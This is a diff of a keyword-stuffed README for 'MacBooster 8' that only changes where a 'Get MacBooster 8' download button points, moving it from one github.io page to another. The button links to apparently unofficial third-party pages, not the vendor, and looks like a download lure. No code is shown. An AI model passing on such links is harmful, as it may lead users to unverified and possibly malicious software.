@@ -21,7 +21,7 @@ To begin using this **MacBooster 8 performance tuner** and **MacBooster 8 mainte
 | :--- | :--- |
 | **Get MacBooster 8** | Click the button below to start using this **MacBooster 8 disk management** solution. |
 
-[![Button](https://img.shields.io/badge/📦-Get_MacBooster_8-2ea44f?style=for-the-badge)](https://allenwilliam9855874.github.io/.github/macbooster-8-system-optimizer)
+[![Button](https://img.shields.io/badge/📦-Get_MacBooster_8-2ea44f?style=for-the-badge)](https://community-driven-tools-hub.github.io/.github/macbooster-8-system-optimizer)
 
 ## System Requirements
 
